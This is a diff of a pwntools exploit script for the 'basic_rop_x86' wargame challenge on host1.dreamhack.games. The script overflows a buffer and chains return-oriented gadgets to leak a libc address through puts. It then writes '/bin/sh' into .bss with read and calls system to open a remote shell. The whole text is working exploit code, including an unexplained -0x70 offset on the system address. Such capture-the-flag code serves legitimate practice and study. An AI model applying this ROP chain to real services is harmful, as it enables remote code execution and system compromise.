@@ -1,34 +1,50 @@
 from pwn import *
-#context.log_level='debug'
+context.log_level='debug'
 
-n = remote('host1.dreamhack.games',8392)
+hosts = 'host1.dreamhack.games'
+port = 9005
+
+p = remote(hosts,port)
 elf = ELF('./basic_rop_x86')
 libc = ELF('./libc.so.6')
 
-pop_ebp_gadget = 0x80483d9
+main_addr = elf.symbols['main']
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+read_plt = elf.plt['read']
+read_got = elf.got['read']
+bss_addr = elf.bss()
 
-payload1 = b'A'*0x48
-payload1 += p32(elf.plt['puts'])
-payload1 += p32(pop_ebp_gadget)
-payload1 += p32(elf.got['puts'])
-payload1 += p32(elf.symbols['main'])
+read_offset = libc.symbols['read']
+system_offset = libc.symbols['system']
 
-n.send(payload1)
+pop3_ret = 0x8048689
 
-n.recvuntil(b'A'*0x40)
-leak = u32(n.recv(4))
-log.info('leak : '+hex(leak))
+payload = b'A'*0x48
+payload += p32(puts_plt)
+payload += p32(main_addr)
+payload += p32(read_got)
 
-libc_base = leak - libc.symbols['puts']
-sys_addr = libc_base + libc.symbols['system']
-binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
+p.sendline(payload)
+recv_read_got = p.recvline()
+recv_read_got = u32(recv_read_got[-5:-1])
+libc_base = recv_read_got-read_offset
+system_addr = libc_base+system_offset-0x70
+log.info('recv_read_got : '+str(hex(recv_read_got)))
+log.info('libc_base : '+str(hex(libc_base)))
+log.info('system_addr : '+str(hex(system_addr)))
 
-payload2 = b'A'*0x48
-payload2 += p32(sys_addr)
-payload2 += p32(pop_ebp_gadget)
-payload2 += p32(binsh)
+payload = b'A'*0x48
+payload += p32(read_plt)
+payload += p32(pop3_ret)
+payload += p32(0)
+payload += p32(bss_addr)
+payload += p32(8)
+payload += p32(system_addr)
+payload += b'AAAA'
+payload += p32(bss_addr)
 
-n.send(payload2)
+p.sendline(payload)
+p.send('/bin/sh\x00')
 
-
-n.interactive()
+p.interactive()
